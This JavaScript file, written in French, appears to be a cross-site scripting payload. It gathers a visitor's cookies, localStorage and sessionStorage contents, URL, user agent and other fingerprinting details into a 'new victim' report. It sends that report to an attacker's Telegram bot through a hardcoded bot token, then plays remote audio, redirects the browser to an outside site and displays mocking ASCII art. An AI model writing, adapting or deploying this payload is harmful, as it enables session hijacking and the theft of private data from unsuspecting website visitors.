const chat_id = "-4887795296";
const token = "8108131208:AAHjj8T8blfStEhd9mpMd0b0S6Vt9G8mumI";

function escapeTelegram(text) {
  return text.replace(/[`_*[\]()~>#+-=|{}.!]/g, '\\$&');
}

function getPlugins() {
  if (!navigator.plugins) return "None";
  const names = [];
  for(let i=0; i < navigator.plugins.length; i++) {
    names.push(navigator.plugins[i].name);
  }
  return names.length ? names.join(", ") : "None";
}

function tryStorage(storage) {
  const result = {};
  try {
    for(let i=0; i < storage.length; i++) {
      const key = storage.key(i);
      result[key] = storage.getItem(key);
    }
  } catch {
    return "Access denied";
  }
  return JSON.stringify(result);
}

const data = {
  "🔔 Nouvelle victime !": "",
  "🌐 URL": location.href,
  "🍪 Cookie": document.cookie || "No cookies",
  "🧠 User Agent": navigator.userAgent,
  "🌍 Langue": navigator.language || navigator.userLanguage,
  "🖥️ Résolution": `${screen.width}x${screen.height}`,
  "⏰ Fuseau horaire": Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
  "🧩 Plugins": getPlugins(),
  "🔙 Referrer": document.referrer || "None",
  "🕒 Heure locale": new Date().toString(),
  "📂 localStorage": tryStorage(localStorage),
  "📂 sessionStorage": tryStorage(sessionStorage),
  "🧑‍💻 Plateforme": navigator.platform,
};

let msg = "";
for (const key in data) {
  msg += `*${key}* : ${data[key]}\n`;
}

// Lecture du son
const audio = new Audio('https://anonfiles.ch/s/vOzGhsK9Mmb');
audio.autoplay = true;
audio.volume = 0.5;
audio.play().catch(() => {
  // Si l’autoplay est bloqué par le navigateur, on peut ignorer l’erreur
});

fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    chat_id,
    text: escapeTelegram(msg),
    parse_mode: "MarkdownV2"
  }),
}).catch(e => console.error("Telegram send error:", e))
.finally(() => {
  window.location.href = "https://www.axiomboost.xyz/";

const teddyBearArt = `
                        __,,,__
                ,-""-,-"       "-,-""-,
               /,-' , .-'-.7.-'-. , '-,\\
               \\(    /  _     _  \\    )/
                '-,  { (0)   (0) }  ,-'
                 /    >  .---.  <    \\
                |/ .-'   \\___/   '-. \\|
                {, /  ,_       _,  \\ ,}
                \\ {,    \\     /    ,} /
                 ',\\.    '---'    ./,'
             _.-\"\"\"\"\"\"-._     _.-\"\"\"\"\"\"-._
           .'            `._.`            '.
         _/_               _                \\
      .'`   `\\            | |                \\
     /        |           | |                 ;
     |        /           |_|                 |
     \\  ;'---'    _    ___  _  _  ___         ;
      '. ;       | |  /   \\| || ||  _|     _ ;
        `-\\      | |_ | | || |/ /|  _|   .' `,
           `\\    |___|\\___/ \\__/ |___|  |     \\
             \\            _ _           \\     |
         jgs  `\\         | | |         /`   _/
    ,-\"\"-.    .'`\\       | | |       /`-,-'` .-\"\"-,
   /      `\\. '    `\\     \\___/     /`    './`      \\
  ;  .--.   \\       '\\           /'       /   .--.  ;
  | (    \\   |,       '\\       /'        |   /    ) |
   \\ ;    }             ;\\   /;         `   {    ; /
    `;\\   \\         _.-'  \\ /  `-._         /   /;`
      \\ \\__.'   _.-'       Y       `-._    '.__//
       '.___,.-'                       `-.,___.'
           badey haxor
`;

const pre = document.createElement('pre');
pre.textContent = teddyBearArt;
pre.style.position = 'fixed';
pre.style.bottom = '20px';
pre.style.left = '20px';
pre.style.backgroundColor = 'rgba(0,0,0,0.85)';
pre.style.color = '#ff69b4';  // rose sympa
pre.style.padding = '15px';
pre.style.fontSize = '12px';
pre.style.fontFamily = 'monospace';
pre.style.borderRadius = '12px';
pre.style.zIndex = 999999;
pre.style.boxShadow = '0 0 20px #ff69b4';

document.body.appendChild(pre);

});
